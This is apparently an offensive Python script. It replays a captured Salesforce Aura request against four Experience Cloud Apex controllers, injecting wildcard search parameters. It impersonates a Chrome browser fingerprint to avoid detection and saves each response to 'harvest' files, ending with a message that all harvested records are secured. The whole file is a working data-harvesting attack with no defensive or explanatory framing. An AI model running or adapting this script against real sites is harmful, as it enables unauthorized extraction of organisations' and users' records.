import json
from curl_cffi import requests
import urllib.parse

print("[*] Loading base captured request structure...")
with open("captured_aura_request.json", "r") as f:
    base_req = json.load(f)

url = base_req["url"]
headers = base_req["headers"]
original_post_data = base_req["post_data"]

# Parse the original form-encoded post data
parsed_data = dict(urllib.parse.parse_qsl(original_post_data))

# High-value Salesforce Experience Cloud / Community controllers to target
target_descriptors = [
    "apex://SupportCommunityFeedController/ACTION$getFeedItems",
    "apex://CaseDeflectionController/ACTION$getArticles",
    "apex://GlobalSearchController/ACTION$search",
    "apex://KnowledgeablePeopleController/ACTION$getKnowledgeablePeople"
]

session = requests.Session()
print(f"[*] Initiating automated multi-descriptor sweep across {len(target_descriptors)} controllers...\n")

for i, descriptor in enumerate(target_descriptors):
    print(f"[*] Targeting: {descriptor}")
    
    # Construct a fresh Aura message payload for each target controller
    message_obj = {
        "actions": [
            {
                "id": f"{300+i};a",
                "descriptor": descriptor,
                "callingDescriptor": "UNKNOWN",
                "params": {"searchTerm": "*", "recordId": "500000000000000AAA"}
            }
        ]
    }
    
    # Update message in form data
    parsed_data["message"] = json.dumps(message_obj)
    new_post_data = urllib.parse.urlencode(parsed_data)
    
    try:
        res = session.post(url, headers=headers, data=new_post_data, impersonate="chrome120", timeout=15)
        print(f"    [+] Status Code: {res.status_code} | Length: {len(res.text)}")
        
        # Save output
        filename = f"harvest_{descriptor.split('/')[-1].replace('$', '_')}.json"
        with open(filename, "w") as out:
            out.write(res.text)
            
        print(f"    [+] Saved response snippet: {res.text[:200]}...")
        print(f"    [+] Written to {filename}\n")
        
    except Exception as e:
        print(f"    [-] Error querying {descriptor}: {e}\n")

print("[🔥] Multi-descriptor sweep complete! All harvested records secured.")

